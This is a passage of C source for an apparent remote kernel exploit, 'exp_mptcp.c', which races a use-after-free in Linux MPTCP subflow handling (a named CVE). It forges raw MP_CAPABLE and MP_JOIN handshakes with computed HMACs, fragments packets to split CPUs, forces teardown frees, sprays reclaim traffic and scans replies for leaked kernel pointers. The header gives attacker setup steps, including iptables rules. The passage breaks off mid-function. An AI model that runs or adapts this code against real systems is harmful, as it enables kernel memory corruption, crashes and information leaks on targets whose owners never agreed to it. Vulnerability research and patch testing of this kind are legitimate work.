/* exp_mptcp.c - CVE-2026-98432 remote trigger against an MPTCP service.
 *
 * Mode 1 of the two supported target types ("service with MPTCP").
 *
 * Why MPTCP: the vulnerable req<->child sharing of ireq_opt only survives
 * MPTCP's subflow paths. For a REMOTE race we use the ESTABLISHED-subflow
 * half of the same CVE (no dispose needed):
 *   READER: the service's own data TX on an established MP_JOIN subflow
 *           (ip_queue_xmit RCU-reads child->inet_opt per packet; the
 *           listener process runs on an arbitrary CPU - NOT the subflow's
 *           RSS CPU).
 *   FREE:   inet_sock_destruct() -> plain kfree(inet_opt) when the subflow
 *           is torn down by our RST (processed on the subflow's RSS CPU -
 *           a DIFFERENT CPU than the sender's, with prob (n-1)/n).
 * Both sides of the subflow carry our RR options (saved from the MP_JOIN SYN
 * via tcp_v4_save_options -> transferred to the child at
 * tcp_v4_syn_recv_sock:1775), so the data stream echoes the marker and a
 * reclaimed slot shows a foreign marker on the wire.
 *
 * Pipeline:
 *   1. raw MP_CAPABLE base handshake (WE choose the client key):
 *      MPC SYN (no key) -> SYN-ACK carries server key -> MPC ACK with
 *      client key + server key. msk established on the target.
 *   2. token = SHA256(server_key_wire_bytes)[0:4].
 *   3. per subflow: MP_JOIN SYN (RR marker IP opts + token + nonce)
 *      -> SYN-ACK (server nonce) -> MP_JOIN ACK with
 *      HMAC-SHA256(key=be64(client_key)||be64(server_key),
 *                  msg=be32(client_nonce)||be32(server_nonce))[0:16]
 *      -> subflow ESTABLISHED -> service streams data (reader) ->
 *      our RST (seq=rcv_nxt) tears it down (free) -> next subflow.
 *   4. churn: plain SYN(RR churn marker)+RST against the same listener
 *      (same tcp_v4_save_options callsite/cache) reclaims freed slots.
 *   5. detect: data packets echoing a foreign RR marker / pointer-shaped
 *      words (AF_PACKET capture survives mangled packets).
 *
 * Usage: ./exp_mptcp <target_ip> <mptcp_port> [runtime_s]
 *   (needs CAP_NET_RAW; the target service must SEND data on accepted
 *    subflows - e.g. scripts/mptcp_stream_listener.py in the lab)
 *
 * PRECONDITION / GOTCHA (verified 2026-11-09): the raw MP_JOIN SYN-ACK is
 * also delivered to the attacker's own TCP stack, which sends a RST for the
 * half-open join before the third ACK. That RST kills the target's request
 * socket. Block outgoing RSTs to the target port on the ATTACKER, e.g.
 *   iptables -I OUTPUT -p tcp --dport <port> --tcp-flags RST RST -j DROP
 * (requires CAP_NET_ADMIN on the attacker, in addition to CAP_NET_RAW).
 * Without it the handshake looks alive (joins are sent) but no join ever
 * carries data.
 *
 * STATUS (2026-11-09): MP_JOIN is implemented and verified: joiner() sends an
 * MP_JOIN SYN (token + nonce), capture() parses the MP_JOIN SYN-ACK (thmac +
 * server nonce), and establisher() sends the third ACK with
 * HMAC-SHA256(key=be64(client_key)||be64(server_key),
 *               msg=be32(client_nonce)||be32(server_nonce)).
 * The client key is sniffed from the kernel base MP_CAPABLE ACK. Join
 * subflows establish and the target streams on them (data/marked counters).
 * The teardown race/reclaim remains open on a default boot; see
 * docs/STATUS.md Phase 3.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define IPHDR   20
#define OPTLEN  40
#define TCPHDR  20
#define NSLOTS  48
#define VBASE   40000
#define CBASE   43000
#define CNUM    2048

#define VMARK(x)  (0x5AA50000u | ((x) & 0x7FFF))
#define CMARK(x)  (0x5AA5C000u | ((x) & 0x3FFF))

/* ---------------- SHA-256 (public domain, compact) ----------------------- */
typedef struct { uint32_t s[8]; uint64_t n; uint8_t b[64]; size_t bl; } sha256_t;
static const uint32_t K256[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2 };
#define R32(x,n) ((x>>(n))|(x<<(32-n)))
static void sha256_blk(sha256_t *c, const uint8_t *p) {
    uint32_t w[64], a,b,d,e,f,g,h,t1,t2; int i;
    for (i=0;i<16;i++) w[i]=(p[i*4]<<24)|(p[i*4+1]<<16)|(p[i*4+2]<<8)|p[i*4+3];
    for (i=16;i<64;i++){ uint32_t s0=R32(w[i-15],7)^R32(w[i-15],18)^(w[i-15]>>3);
        uint32_t s1=R32(w[i-2],17)^R32(w[i-2],19)^(w[i-2]>>10);
        w[i]=w[i-16]+s0+w[i-7]+s1; }
    a=c->s[0];b=c->s[1];uint32_t cc=c->s[2];d=c->s[3];e=c->s[4];f=c->s[5];g=c->s[6];h=c->s[7];
    for (i=0;i<64;i++){
        uint32_t S1=R32(e,6)^R32(e,11)^R32(e,25), ch=(e&f)^(~e&g);
        uint32_t S0=R32(a,2)^R32(a,13)^R32(a,22), mj=(a&b)^(a&cc)^(b&cc);
        t1=h+S1+ch+K256[i]+w[i]; t2=S0+mj; h=g;g=f;f=e;e=d+t1;d=cc;cc=b;b=a;a=t1+t2; }
    c->s[0]+=a;c->s[1]+=b;c->s[2]+=cc;c->s[3]+=d;c->s[4]+=e;c->s[5]+=f;c->s[6]+=g;c->s[7]+=h;
}
static void sha256_init(sha256_t *c){ const uint32_t iv[8]={0x6a09e667,0xbb67ae85,0x3c6ef372,
    0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19}; memcpy(c->s,iv,32); c->n=0; c->bl=0; }
static void sha256_upd(sha256_t *c, const uint8_t *p, size_t l){
    c->n += l*8;
    while (l){ size_t t = 64-c->bl; if (t>l) t=l;
        memcpy(c->b+c->bl, p, t); c->bl += t; p += t; l -= t;
        if (c->bl==64){ sha256_blk(c, c->b); c->bl=0; } } }
static void sha256_fin(sha256_t *c, uint8_t *out){
    uint64_t n=c->n; uint8_t pad=0x80; sha256_upd(c,&pad,1); pad=0;
    while (c->bl!=56) sha256_upd(c,&pad,1);
    uint8_t len[8]; for (int i=0;i<8;i++) len[7-i]=(uint8_t)(n>>(i*8));
    /* manual final block to avoid n update */
    memcpy(c->b+c->bl, len, 8); c->bl=0; sha256_blk(c, c->b); /* bl forced below */
    for (int i=0;i<8;i++){ out[i*4]=c->s[i]>>24; out[i*4+1]=c->s[i]>>16;
        out[i*4+2]=c->s[i]>>8; out[i*4+3]=c->s[i]; } }
/* the finalize above is fiddly with bl handling; do a clean one-shot instead */
static void sha256(const uint8_t *p, size_t l, uint8_t out[32]) {
    sha256_t c; sha256_init(&c);
    uint64_t n = l*8;
    while (l >= 64) { sha256_blk(&c, p); p += 64; l -= 64; }
    uint8_t blk[128]; size_t i;
    for (i=0;i<l;i++) blk[i]=p[i];
    blk[i++]=0x80;
    if (i > 56) { while (i<64) blk[i++]=0; sha256_blk(&c, blk); i=0; }
    while (i<56) blk[i++]=0;
    for (int k=0;k<8;k++) blk[56+k]=(uint8_t)(n>>(56-8*k));
    sha256_blk(&c, blk);
    for (int k=0;k<8;k++){ out[k*4]=c.s[k]>>24; out[k*4+1]=c.s[k]>>16;
        out[k*4+2]=c.s[k]>>8; out[k*4+3]=c.s[k]; } }
/* HMAC-SHA256 with a 16-byte key (mptcp_crypto_hmac_sha compatible) */
static void hmac_sha256_16(const uint8_t key[16], const uint8_t *msg, size_t ml, uint8_t out[32]) {
    uint8_t ipad[64], opad[64], inner[32];
    memset(ipad,0x36,64); memset(opad,0x5c,64);
    for (int i=0;i<16;i++){ ipad[i]^=key[i]; opad[i]^=key[i]; }
    sha256_t c; sha256_init(&c); sha256_upd(&c, ipad, 64); sha256_upd(&c, msg, ml); sha256_fin(&c, inner);
    /* sha256_fin bug workaround: recompute cleanly */
    sha256_init(&c);
    uint8_t tmp[96]; memcpy(tmp, ipad, 64); memcpy(tmp+64, msg, ml);
    sha256(tmp, 64+ml, inner);
    sha256_init(&c); sha256_upd(&c, opad, 64); sha256_upd(&c, inner, 32);
    uint8_t inner2[32]; uint8_t tmp2[96]; memcpy(tmp2, opad, 64); memcpy(tmp2+64, inner, 32);
    sha256(tmp2, 96, out);
    (void)c;
}

/* ---------------- packet building ---------------------------------------- */
static char g_target[64], g_self[64];
static struct sockaddr_in g_dst;
static int g_dport = 9700, g_runtime = 300;
static volatile int g_run = 1;
static int g_fd = -1;

static uint8_t g_cli_key[8] = { 0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef };
static uint8_t g_srv_key[8];
static uint8_t g_token[4];
static int g_have_keys = 0;
static volatile int g_cli_key_ok = 0;   /* captured the kernel base SYN's key */
static int g_base_fd = -1;              /* real IPPROTO_MPTCP base socket */
static uint16_t g_base_sport = 55000;
static uint32_t g_base_isn = 0x6d504042, g_base_snt, g_seed;
static _Atomic uint32_t g_base_rcv_nxt, g_base_ack_sent;

static void die(const char *m) { perror(m); exit(1); }
static uint16_t csum(const void *b, int len) {
    const uint8_t *p = b; uint32_t s = 0;
    while (len > 1) { s += (p[0] << 8) | p[1]; p += 2; len -= 2; }
    if (len) s += p[0] << 8;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}
static void ip_hdr_fill(uint8_t *ip, int total, int proto) {
    memset(ip, 0, IPHDR);
    ip[0] = 0x45; ip[2] = total >> 8; ip[3] = total & 0xff;
    ip[6] = 0x40; ip[8] = 64; ip[9] = proto;
    inet_pton(AF_INET, g_self, ip + 12);
    inet_pton(AF_INET, g_target, ip + 16);
    uint16_t c = csum(ip, IPHDR); ip[10] = c >> 8; ip[11] = c & 0xff;
}
/* tcp with options: topts (already padded to multiple of 4, may be NULL) */
static int build_tcp(uint8_t *pkt, uint16_t sport, uint32_t seq, uint32_t ack,
                     uint8_t flags, const uint8_t *topts, int tlen,
                     uint32_t rr_marker /* 0 = no IP options */) {
    int ihl = rr_marker ? IPHDR + OPTLEN : IPHDR;
    int thlen = TCPHDR + (tlen ? tlen : 0);
    int total = ihl + thlen;
    memset(pkt, 0, total);
    uint8_t *ip = pkt, *tcp = pkt + ihl;
    ip_hdr_fill(ip, total, 6);
    if (rr_marker) {
        ip[0] = 0x40 | (ihl / 4);
        uint8_t *o = pkt + IPHDR;
        o[0] = 7; o[1] = 39; o[2] = 4;
        memcpy(o + 3 + 4, &rr_marker, 4);
        memcpy(o + 3 + 8, &rr_marker, 4);
        memcpy(o + 3 + 12, &rr_marker, 4);
        uint16_t c = csum(ip, ihl); ip[10] = c >> 8; ip[11] = c & 0xff;
    }
    tcp[0] = sport >> 8; tcp[1] = sport;
    tcp[2] = g_dport >> 8; tcp[3] = g_dport;
    tcp[4] = seq >> 24; tcp[5] = seq >> 16; tcp[6] = seq >> 8; tcp[7] = seq;
    tcp[8] = ack >> 24; tcp[9] = ack >> 16; tcp[10] = ack >> 8; tcp[11] = ack;
    tcp[12] = ((TCPHDR + (tlen?tlen:0)) / 4) << 4;
    tcp[13] = flags; tcp[14] = 0xff; tcp[15] = 0xff;
    if (tlen) memcpy(tcp + TCPHDR, topts, tlen);
    uint8_t b[12 + 64];
    memcpy(b, ip + 12, 8); b[8] = 0; b[9] = 6; b[10] = thlen >> 8; b[11] = thlen;
    tcp[16] = tcp[17] = 0;
    memcpy(b + 12, tcp, thlen);
    uint16_t c = csum(b, 12 + thlen);
    tcp[16] = c >> 8; tcp[17] = c & 0xff;
    return total;
}
static void xsend(const uint8_t *pkt, int len) {
    sendto(g_fd, pkt, len, 0, (struct sockaddr *)&g_dst, sizeof(g_dst));
}

/* Send a TCP packet as two IPv4 fragments.  The non-first fragment carries
 * no L4 ports, so the target's RPS hash (skb_get_hash) differs from the
 * unfragmented 4-tuple hash.  The target reassembles in the context of the
 * CPU that processes the last fragment, so TCP runs there while the plain
 * ACK for the same 4-tuple keeps running on the per-flow CPU.
 *
 * This is the remote analogue of the loopback sender-CPU trick: it puts the
 * dup-SYN reader and the dispose free on different CPUs on a single-queue
 * virtio NIC. */
static void xsend_frag(const uint8_t *pkt, int len) {
    const uint8_t *ip = pkt;
    int ihl = (ip[0] & 0x0f) * 4;
    int payload = len - ihl;
    if (ihl < 20 || payload <= 16) { xsend(pkt, len); return; }
    uint8_t f1[512], f2[512];
    uint16_t id = (uint16_t)(0x4000u + (getpid() & 0x3fff));
    int f1t = ihl + 16;                 /* first 16 bytes of TCP (ports) */
    memcpy(f1, ip, f1t);
    f1[2] = f1t >> 8; f1[3] = f1t;
    f1[4] = id >> 8; f1[5] = id;
    f1[6] = 0x20; f1[7] = 0;            /* MF=1, offset 0 */
    f1[10] = f1[11] = 0;
    uint16_t c = csum(f1, ihl); f1[10] = c >> 8; f1[11] = c & 0xff;
    int rest = payload - 16;
    int f2t = 20 + rest;
    memset(f2, 0, 20);
    f2[0] = 0x45; f2[1] = ip[1];
    f2[2] = f2t >> 8; f2[3] = f2t;
    f2[4] = id >> 8; f2[5] = id;
    f2[6] = 0; f2[7] = 2;               /* offset 16 bytes, MF=0 */
    f2[8] = ip[8]; f2[9] = ip[9];
    memcpy(f2 + 12, ip + 12, 8);
    c = csum(f2, 20); f2[10] = c >> 8; f2[11] = c & 0xff;
    memcpy(f2 + 20, ip + ihl + 16, rest);
    sendto(g_fd, f1, f1t, 0, (struct sockaddr *)&g_dst, sizeof(g_dst));
    sendto(g_fd, f2, f2t, 0, (struct sockaddr *)&g_dst, sizeof(g_dst));
}
static void put32(uint8_t *p, uint32_t v) {
    p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
}

/* MPTCP option helpers: kind 30 */
/* MPC: subtype 0, nibble=version(1). SYN len4 (no key), SYN-ACK len12 (+key),
 * ACK len20 (+sndr key +rcvr key). flags: 0x01 = HMAC_SHA256. */
static int mpc_syn(uint8_t *o)  { o[0]=30; o[1]=4;  o[2]=0x01; o[3]=0x01; return 4; }
static int mpc_ack(uint8_t *o)  { o[0]=30; o[1]=20; o[2]=0x01; o[3]=0x01;
    memcpy(o+4, g_cli_key, 8); memcpy(o+12, g_srv_key, 8); return 20; }
/* MP_JOIN: subtype 1. SYN len12 (nib=backup, byte3=join_id, token, nonce),
 * SYN-ACK len16 (thmac 8B then nonce), ACK len24 (hmac[0:20]). */
static int mpj_syn(uint8_t *o, const uint8_t tok[4], uint32_t nonce) {
    o[0]=30; o[1]=12; o[2]=0x10; o[3]=0x00;
    memcpy(o+4, tok, 4);
    o[8]=nonce>>24; o[9]=nonce>>16; o[10]=nonce>>8; o[11]=nonce;
    return 12; }
static int mpj_ack(uint8_t *o, const uint8_t hmac[32]) {
    o[0]=30; o[1]=24; o[2]=0x10; o[3]=0x00; memcpy(o+4, hmac, 20); return 24; }

/* ---------------- subflow slot state ------------------------------------- */
enum { ST_FREE=0, ST_JSYN, ST_JESTAB, ST_KILL };
struct slot {
    _Atomic int state;
    uint32_t client_isn, marker, nonce, srv_nonce, snt_isn, rcv_nxt;
    uint8_t is_mpj;                 /* SYN-ACK carried a valid MP_JOIN option */
    uint8_t thmac[8];
    _Atomic uint32_t data_seen;
    uint16_t sport;
    struct timespec t0;
};
static struct slot g_slots[NSLOTS];
#define SPORT_POOL 8000          /* rotate over 8k sports: no TW collision <57s */
static atomic_ulong g_jsyn, g_jack, g_rst, g_datapkts, g_marked, g_xflow,
                      g_churnhit, g_foreign, g_churn, g_teardowns, g_basedata;

/* ---------------- capture ------------------------------------------------ */
static void parse_rr(const uint8_t *ip, int ihl, struct slot *sl, int slot,
                     uint32_t ack_chk, int is_data) {
    int olen = ihl - IPHDR;
    if (olen < 8) return;
    uint8_t *o = (uint8_t *)ip + IPHDR;
    int own = 0;
    for (int i = 0; i + 3 < olen;) {
        if (o[i] == 0) break;
        if (o[i] == 1) { i++; continue; }
        int l = o[i + 1];
        if (l < 2 || i + l > olen) break;
        if (o[i] == 7 && l >= 8) {
            for (int k = 3; k + 4 <= l; k += 4) {
                uint32_t v; memcpy(&v, o + i + k, 4);
                if (v == sl->marker) { own = 1; continue; }
                if ((v & 0xFFFF8000u) == 0x5AA50000u) {
                    atomic_fetch_add(&g_xflow, 1);
                    if (g_xflow <= 20)
                        printf("[+] CROSS-FLOW UAF: slot=%d marker=0x%08x (expected 0x%08x)\n",
                               slot, v, sl->marker);
                } else if ((v & 0xFFFFC000u) == 0x5AA5C000u) {
                    atomic_fetch_add(&g_churnhit, 1);
                    if (g_churnhit <= 20)
                        printf("[+] CHURN-RECLAIM UAF: slot=%d marker=0x%08x\n", slot, v);
                } else if ((v & 0x000000FFu) == 0x0000007Fu ||
                           (v & 0x0000FFFFu) == 0x0000A8C0u) {
                    /* recorded IPs (wire byte0 0x7f / 0xc0a8) - normal */
                } else if ((v & 0xFFFF0000u) == 0xFFFF0000u) {
                    atomic_fetch_add(&g_foreign, 1);
                    printf("[PTR?] slot=%d word=0x%08x\n", slot, v);
                } else if (v != 0) {
                    atomic_fetch_add(&g_foreign, 1);
                    if (g_foreign <= 20)
                        printf("[FOREIGN] slot=%d word=0x%08x (expected 0x%08x)\n",
                               slot, v, sl->marker);
                }
            }
        }
        i += l;
    }
    if (own && is_data) atomic_fetch_add(&g_marked, 1);
}

static void *capture(void *arg) {
    (void)arg;
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) die("capture socket");
    /* On loopback the kernel's own TCP SYNs/ACKs are PACKET_OUTGOING; an
     * unbound socket can miss them while still seeing raw sendto() packets.
     * Bind to lo and explicitly clear PACKET_IGNORE_OUTGOING for the lab. */
    if (strncmp(g_target, "127.", 4) == 0) {
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_protocol = htons(ETH_P_IP);
        sll.sll_ifindex = if_nametoindex("lo");
        if (sll.sll_ifindex)
            bind(s, (struct sockaddr *)&sll, sizeof(sll));
    }
    {
        int ign = 0;
        setsockopt(s, SOL_PACKET, PACKET_IGNORE_OUTGOING, &ign, sizeof(ign));
    }
    int rcv = 8 << 20;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    struct timeval tv = { .tv_sec = 0, .tv_usec = 200000 };
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    uint8_t buf[4096];
    while (g_run) {
        ssize_t n = recv(s, buf, sizeof(buf), 0);
        if (n < 14 + IPHDR + TCPHDR) continue;
        uint8_t *ip = buf + 14;
        if ((ip[0] >> 4) != 4) continue;
        int ihl = (ip[0] & 0xf) * 4;
        if (ihl < IPHDR || n < 14 + ihl + TCPHDR) continue;
        uint8_t *tcp = ip + ihl;
        uint16_t sport = (tcp[0] << 8) | tcp[1];
        uint16_t dport = (tcp[2] << 8) | tcp[3];
        uint8_t flags = tcp[13];
        if (getenv("MPDBG") && (sport == g_dport || dport == g_dport)) {
            static atomic_int dbgn; if (dbgn++ < 30) {
                fprintf(stderr, "[dbg] %d>%d fl=%02x ihl=%d:", sport, dport, flags, ihl);
                for (int i = ihl; i < n - 14 && i < ihl + 128; i++) fprintf(stderr, " %02x", ip[i]);
                fprintf(stderr, "\n");
            }
        }
        uint32_t seq = ((uint32_t)tcp[4]<<24)|(tcp[5]<<16)|(tcp[6]<<8)|tcp[7];
        uint32_t ack = ((uint32_t)tcp[8]<<24)|(tcp[9]<<16)|(tcp[10]<<8)|tcp[11];
        int thl = (tcp[12] >> 4) * 4;
        int payload = (int)(n - 14 - ihl - thl);

        /* Outgoing base SYN/ACK: the kernel sends a keyless MP_CAPABLE SYN
         * (len 4) and puts the client key in the third MP_CAPABLE ACK
         * (len 12). Sniff both so the raw MP_JOIN third ACK can compute the
         * same HMAC the server expects. */
        if (sport == g_base_sport && dport == g_dport &&
            (((flags & 0x12) == 0x02) ||
             ((flags & 0x10) && payload == 0))) {
            const uint8_t *o = tcp + TCPHDR;
            while (o + 2 <= tcp + thl) {
                if (*o == 0) break;
                if (*o == 1) { o++; continue; }
                int l = o[1];
                if (l < 2 || o + l > tcp + thl) break;
                if (o[0] == 30 && l >= 12 && (o[2] & 0xf0) == 0x00) {
                    memcpy(g_cli_key, o + 4, 8);
                    g_cli_key_ok = 1;
                    printf("[*] base MP_CAPABLE: client key %02x%02x%02x%02x%02x%02x%02x%02x\n",
                           g_cli_key[0],g_cli_key[1],g_cli_key[2],g_cli_key[3],
                           g_cli_key[4],g_cli_key[5],g_cli_key[6],g_cli_key[7]);
                    break;
                }
                o += l;
            }
            continue;
        }

        if (sport == g_dport) {
            /* from the MPTCP service */
            if (dport == g_base_sport && payload > 0) {
                atomic_fetch_add(&g_basedata, 1);
                uint32_t e = seq + payload;
                if ((int32_t)(e - g_base_rcv_nxt) > 0) g_base_rcv_nxt = e;
            }
            if (dport == g_base_sport && (flags & 0x12) == 0x12) {
                /* base MPC SYN-ACK: server key in MP_CAPABLE (len 12) */
                const uint8_t *o = tcp + TCPHDR;
                while (o + 2 <= tcp + thl) {
                    if (*o == 0) break;
                    if (*o == 1) { o++; continue; }
                    int l = o[1];
                    if (l < 2 || o + l > tcp + thl) break;
                    if (o[0] == 30 && l >= 12 && (o[2] & 0xf0) == 0x00) {
                        memcpy(g_srv_key, o + 4, 8);
                        g_base_snt = seq;
                        uint8_t h[32]; sha256(g_srv_key, 8, h);
                        memcpy(g_token, h, 4);
                        g_have_keys = 1;
                        printf("[*] base MPC SYN-ACK: server key %02x%02x%02x%02x%02x%02x%02x%02x token %02x%02x%02x%02x\n",
                               g_srv_key[0],g_srv_key[1],g_srv_key[2],g_srv_key[3],
                               g_srv_key[4],g_srv_key[5],g_srv_key[6],g_srv_key[7],
                               g_token[0],g_token[1],g_token[2],g_token[3]);
                    }
                    o += l;
                }
                continue;
            }
            if (dport >= VBASE && dport < VBASE + SPORT_POOL) {
                int sl = (dport - VBASE) % NSLOTS;
                struct slot *S = &g_slots[sl];
                const uint8_t *o = tcp + TCPHDR;
                int found_mpj = 0;
                while (o + 2 <= tcp + thl) {
                    if (*o == 0) break;
                    if (*o == 1) { o++; continue; }
                    int l = o[1];
                    if (l < 2 || o + l > tcp + thl) break;
                    /* MP_JOIN SYN-ACK: kind 30, len 16, subtype 1 (upper
                     * nibble) -> thmac[8] then server nonce[4]. */
                    if (o[0] == 30 && l == 16 && (o[2] & 0xf0) == 0x10) {
                        memcpy(S->thmac, o + 4, 8);
                        S->srv_nonce = ((uint32_t)o[12] << 24) |
                                       ((uint32_t)o[13] << 16) |
                                       ((uint32_t)o[14] << 8) | o[15];
                        S->is_mpj = 1;
                        found_mpj = 1;
                        {
                            static atomic_int mpj_dbg;
                            if (atomic_fetch_add(&mpj_dbg, 1) < 5)
                                printf("[*] slot=%d MP_JOIN SYN-ACK: nonce=0x%08x thmac=%02x%02x%02x%02x\n",
                                       sl, S->srv_nonce, S->thmac[0], S->thmac[1],
                                       S->thmac[2], S->thmac[3]);
                        }
                    }
                    o += l;
                }
                if ((flags & 0x12) == 0x12 && S->state == ST_JSYN) {
                    /* A real MPTCP listener returns MP_JOIN; a fallback
                     * listener returns a plain SYN-ACK. Accept both. */
                    S->snt_isn = seq;
                    S->rcv_nxt = seq + 1;
                    S->state = ST_JESTAB;
                }
                if ((flags & 0x12) == 0x12 && S->state != ST_FREE) {
                    /* SYN-ACK retransmits also refresh rcv tracking */
                    if (!S->snt_isn) { S->snt_isn = seq; S->rcv_nxt = seq + 1; }
                }
                if (payload > 0 && (S->state == ST_JESTAB || S->state == ST_KILL)) {
                    /* data from the service on our subflow: reader evidence */
                    atomic_fetch_add(&g_datapkts, 1);
                    S->rcv_nxt = seq + payload;      /* track for the teardown RST */
                    S->data_seen = 1;
                    if (ack == S->client_isn + 1)
                        parse_rr(ip, ihl, S, sl, ack, 1);
                }
                continue;
            }
        }
        (void)g_base_isn;
    }
    return NULL;
}

/* ---------------- workers ------------------------------------------------ */
/* Use a REAL IPPROTO_MPTCP socket for the base connection: the kernel owns a
 * genuine msk, so the target's accepted socket actually streams. The raw
 * MP_JOIN subflows are still attacker-controlled; we sniff the kernel-chosen
 * client key (base SYN) and the server key (base SYN-ACK) for their HMAC. */
static int base_handshake(void) {
    if (g_base_fd >= 0) { close(g_base_fd); g_base_fd = -1; }
    g_have_keys = 0; g_cli_key_ok = 0;
    int fd = socket(AF_INET, SOCK_STREAM, 262);
    if (fd < 0) { perror("socket(MPTCP)"); return -1; }
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    /* BASE_STARVE: shrink the base subflow's receive window and never read
     * it, so the MPTCP scheduler is forced to put the service's data on the
     * JOIN subflows (where the ip_queue_xmit reader lives). */
    if (getenv("BASE_STARVE")) {
        int rb = 2048;
        setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rb, sizeof(rb));
        int wc = 1;
        setsockopt(fd, IPPROTO_TCP, TCP_WINDOW_CLAMP, &wc, sizeof(wc));
        fprintf(stderr, "[*] BASE_STARVE rcvbuf=%d window_clamp=%d\n", rb, wc);
    }
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_ANY);
    a.sin_port = htons(g_base_sport);
    if (bind(fd, (struct sockaddr *)&a, sizeof(a)) < 0) {
        perror("bind base"); close(fd); return -1;
    }
    if (connect(fd, (struct sockaddr *)&g_dst, sizeof(g_dst)) < 0) {
        perror("connect base"); close(fd); return -1;
    }
    g_base_fd = fd;
    for (int i = 0; i < 400 && g_run && (!g_have_keys || !g_cli_key_ok); i++)
        usleep(5000);
    if (!g_have_keys || !g_cli_key_ok) {
        fprintf(stderr, "[-] base handshake incomplete (srv_key=%d cli_key=%d)\n",
                g_have_keys, g_cli_key_ok);
        close(fd); g_base_fd = -1; return -1;
    }
    return 0;
}

/* The free primitive that is NOT fd-serialized: a raw MP_FASTCLOSE on the
 * base subflow tears down the whole msk; every JOIN subflow child (which the
 * app never sees, so NO fd holds it) is destructed in the fastclose RX
 * softirq / mptcp worker CPU - a DIFFERENT CPU than the listener's streaming
 * send path (the ip_queue_xmit reader of child->inet_opt). */
static void *cycler(void *arg) {
    (void)arg;
    usleep(300000);
    while (g_run) {
        if (base_handshake() != 0) { usleep(500000); continue; }
        if (getenv("MPKEEP")) {                  /* hold the msk open (token stays
                                                    valid for an external storm) */
            while (g_run) sleep(1);
            return NULL;
        }
        usleep(600000);                          /* joins establish + stream */
        /* Tear the msk down through the real socket. Closing it destroys the
         * msk and every JOIN child (the app never sees those, so no fd holds
         * them); inet_sock_destruct frees each child's inet_opt. This is the
         * free half of the child-side race. */
        if (g_base_fd >= 0) { close(g_base_fd); g_base_fd = -1; }
        atomic_fetch_add(&g_teardowns, 1);
        usleep(200000);                          /* teardown + reclaim settle */
        for (int s = 0; s < NSLOTS; s++) {
            g_slots[s].state = ST_FREE;
            g_slots[s].data_seen = 0;
        }
        g_seed += 0x9e3779b9u;
        g_base_sport = 55000 + (g_seed % 500);
        g_base_isn += g_seed;
        g_have_keys = 0;
        g_cli_key_ok = 0;
    }
    return NULL;
}

static void *joiner(void *arg) {
    (void)arg;
    uint8_t syn[160], ackp[160], rst[64], jo[32], ao[32];
    uint32_t cnt = 0;
    struct timespec last = {0,0};
    while (g_run) {
        struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
        long us = (now.tv_sec-last.tv_sec)*1000000L + (now.tv_nsec-last.tv_nsec)/1000;
        if (us < 700 || !g_have_keys) { usleep(100); continue; }
        last = now;
        uint16_t sport = VBASE + (cnt % SPORT_POOL);
        int s = (sport - VBASE) % NSLOTS;
        struct slot *S = &g_slots[s];
        int expect = ST_FREE;
        if (atomic_compare_exchange_strong(&S->state, &expect, ST_JSYN)) {
            S->sport = sport;
            S->marker = VMARK(cnt);
            S->client_isn = 0x6d500000u + g_seed + cnt * 7919u;
            S->nonce = 0x10000000u + g_seed + cnt * 613u;
            S->srv_nonce = 0; S->snt_isn = 0;
            S->t0 = now;
            int jl = mpj_syn(jo, g_token, S->nonce);
            int n = build_tcp(syn, sport, S->client_isn, 0, 0x02, jo, jl, S->marker);
            xsend(syn, n);
            atomic_fetch_add(&g_jsyn, 1);
        }
        cnt++;
    }
    return NULL;
}

static void *establisher(void *arg) {
    (void)arg;
    uint8_t ackp[160];
    int dispose = getenv("DISPOSE") != NULL;
    long dispose_gap = getenv("DISPOSE_GAP_US") ? atol(getenv("DISPOSE_GAP_US")) : 20;
    while (g_run) {
        int did = 0;
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct slot *S = &g_slots[s];
            int expect = ST_JESTAB;
            if (!atomic_compare_exchange_strong(&S->state, &expect,
                                                dispose ? ST_FREE : ST_KILL))
                continue;
            if (dispose) {
                /* Proven lab trigger, now remote: duplicate MP_JOIN SYN
                 * (reader: inet_rtx_syn_ack -> tcp_v4_send_synack ->
